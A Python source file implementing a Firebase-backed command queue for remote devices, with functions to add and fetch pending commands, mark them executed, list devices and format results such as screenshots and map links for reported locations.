import datetime
import log_util
import uuid
from firebase_client import get_reference, get_data, update_data, set_data
from log_util import logger


class CommandManager:
    """
    Manage commands for connected devices using Firebase
    """

    @staticmethod
    def add_command(device_id, command_data):
        """Add a command for a device to Firebase"""
        try:
            # Validate command data
            if not isinstance(command_data, dict):
                command_data = {"command": command_data}

            # Create reference to Firebase location
            command_ref = get_reference(f'commands/{device_id}')

            # Get existing commands
            commands_data = get_data(f'commands/{device_id}') or {"pending": [], "executed": []}

            # Add timestamp and ID to command
            command_data["created_at"] = datetime.datetime.now().isoformat()
            command_data["id"] = str(uuid.uuid4())  # Add unique ID

            # Add command to pending list
            pending_commands = commands_data.get("pending", [])
            pending_commands.append(command_data)

            # Update Firebase
            update_data(f'commands/{device_id}', {
                "pending": pending_commands
            })

            logger.info(f"Added command to device {device_id}: {command_data}")
            return True
        except Exception as e:
            logger.error(f"Error adding command to Firebase: {str(e)}")
            return False

    @staticmethod
    def get_pending_commands(device_id):
        """Get pending commands for a device from Firebase"""
        try:
            # Get commands from Firebase
            commands_data = get_data(f'commands/{device_id}') or {"pending": [], "executed": []}

            # Get pending commands
            pending_commands = commands_data.get("pending", [])

            # Move pending commands to executed
            executed_commands = commands_data.get("executed", [])
            for cmd in pending_commands:
                cmd["executed_at"] = datetime.datetime.now().isoformat()
                executed_commands.append(cmd)

            # Update Firebase
            update_data(f'commands/{device_id}', {
                "pending": [],
                "executed": executed_commands
            })

            return pending_commands

        except Exception as e:
            logger.error(f"Error getting pending commands: {str(e)}")
            return []

    @staticmethod
    def mark_command_executed(device_id, command_id, result=None):
        """Mark a command as executed in Firebase"""
        try:
            commands_data = get_data(f'commands/{device_id}') or {"pending": [], "executed": []}
            pending_commands = commands_data.get("pending", [])
            executed_commands = commands_data.get("executed", [])

            # Find command by ID and move to executed
            updated_pending = []
            executed_command = None

            for cmd in pending_commands:
                if cmd.get('id') == command_id:
                    executed_command = cmd
                else:
                    updated_pending.append(cmd)

            if executed_command:
                # Update command with execution time
                executed_command["executed_at"] = datetime.datetime.now().isoformat()
                if result:
                    executed_command["result"] = result

                # Add to executed list
                executed_commands.append(executed_command)

                # Update Firebase
                update_data(f'commands/{device_id}', {
                    "pending": updated_pending,
                    "executed": executed_commands
                })

                # Also store result separately
                if result:
                    set_data(f'command_results/{device_id}/{command_id}', {
                        "timestamp": datetime.datetime.now().isoformat(),
                        "result": result
                    })

                logger.info(f"Marked command {command_id} as executed for device {device_id}")
                return True

            return False
        except Exception as e:
            logger.error(f"Error marking command as executed: {str(e)}")
            return False

    @staticmethod
    def get_devices():
        """Get list of registered devices from Firebase"""
        try:
            # Get devices from Firebase
            devices_data = get_data('devices') or {}

            # Convert to list
            devices = []
            for device_id, device_data in devices_data.items():
                device_data['device_id'] = device_id

                # Ensure device_info exists
                if 'device_info' not in device_data:
                    device_data['device_info'] = {}

                # Add default values if missing
                if not device_data.get('registration_time'):
                    device_data['registration_time'] = "unknown"
                if not device_data.get('last_seen'):
                    device_data['last_seen'] = "unknown"

                devices.append(device_data)

            return devices
        except Exception as e:
            logger.error(f"Error getting devices from Firebase: {str(e)}")
            return []

    @staticmethod
    def get_command_results(device_id):
        """Get command results for a device"""
        try:
            # Get command results from Firebase
            results_data = get_data(f'command_results/{device_id}') or {}

            # Get command info from executed commands
            commands_data = get_data(f'commands/{device_id}/executed') or []

            # Combine data
            combined_results = []
            for command_id, result_data in results_data.items():
                # Find matching command
                command_info = next((cmd for cmd in commands_data if cmd.get('id') == command_id), {})

                # Create a structured result object
                command_result = {
                    "command_id": command_id,
                    "command_type": command_info.get('command', 'unknown'),
                    "executed_at": result_data.get('timestamp', 'unknown'),
                    "result": result_data.get('result', {})
                }

                # Format result based on command type
                if command_info.get('command') == 'capture_screenshot' and isinstance(result_data.get('result'), dict):
                    # Ensure image data is properly formatted
                    image_data = result_data.get('result', {}).get('image_data')
                    if image_data and isinstance(image_data, str):
                        command_result['result']['image_data'] = image_data

                # Format location data with map link if applicable
                if command_info.get('command') == 'get_location':
                    location_result = result_data.get('result', {})
                    if 'latitude' in location_result and 'longitude' in location_result:
                        lat = location_result['latitude']
                        lng = location_result['longitude']
                        command_result['result']['map_url'] = f"https://maps.google.com/?q={lat},{lng}"

                combined_results.append(command_result)

            # Sort by execution time (newest first)
            combined_results.sort(key=lambda x: x.get('executed_at', ''), reverse=True)

            return combined_results
        except Exception as e:
            logger.error(f"Error getting command results: {str(e)}")
            return []